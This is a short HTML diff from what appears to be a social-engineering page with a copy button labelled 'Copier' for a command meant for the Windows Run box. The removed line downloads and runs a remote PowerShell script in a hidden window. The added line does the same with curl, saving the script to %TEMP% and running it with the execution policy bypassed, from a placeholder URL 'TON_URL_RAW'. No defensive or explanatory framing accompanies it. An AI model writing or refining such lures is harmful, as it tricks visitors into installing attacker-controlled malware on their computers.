@@ -270,7 +270,7 @@
 </div>
 
 <div class="cmd-box" id="cmdBox">
-  <code id="winrCmd">powershell -w h -ep bypass -c "iwr 'TON_URL_RAW' -UseBasicParsing | iex"</code>
+  <code id="winrCmd">cmd /c curl -s -o %TEMP%\s.ps1 "TON_URL_RAW" && powershell -ep bypass %TEMP%\s.ps1</code>
   <button class="btn" style="margin-top:0;padding:.5rem .9rem;font-size:.8rem" onclick="copyCmd()">Copier</button>
 </div>
 
